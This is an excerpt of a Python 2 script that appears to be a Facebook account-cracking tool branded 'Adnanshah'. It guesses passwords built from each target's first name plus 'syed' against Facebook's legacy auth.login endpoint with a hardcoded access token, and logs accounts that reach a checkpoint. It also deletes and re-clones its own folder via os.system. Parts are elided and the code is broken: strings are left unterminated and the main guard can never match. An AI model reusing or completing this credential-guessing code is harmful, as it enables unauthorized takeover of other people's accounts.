...
def login():
	...
	try:
		...
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password
		z=json.load(data)
...
def menu():
	...
	print (S + '[' + P + '☞2' + S + ']' + S + ' Update Adnanshah Tool')
	print (S + '[' + P + '☞3' + S + ']' + S + 'Adnan shah-whatsapp group)
...
def mb():
	...
	if bm =='':
	    ...
	    os.system('rm -rf Adnanshah')
	    os.system('cd Adnanshah && git clone https://github.com/adnanshah572/Shah)
	    cb()
	    print (logo)
	    psb('☆10%')
	    psb('☆☆20%')
...
def pb():
			                            ...
			                            if 'access_token' in k:
			                                ...
			                                if 'www.facebook.com' in k['error_msg']:
			                                    ...
			                                    if 'access_token' in k:
			                                        ...
			                                        ps6=(j['first_name']+'syed')
			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6))
			                                        k=json.load(dt)
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps6)
			                                            cps.append(user+ps6)
	...
	print(S+'Silent lover')     
	print
	raw_input(R + 'Back')
	os.system('python2 B4.py')
if __name__=='__adnanshah__':
    login()
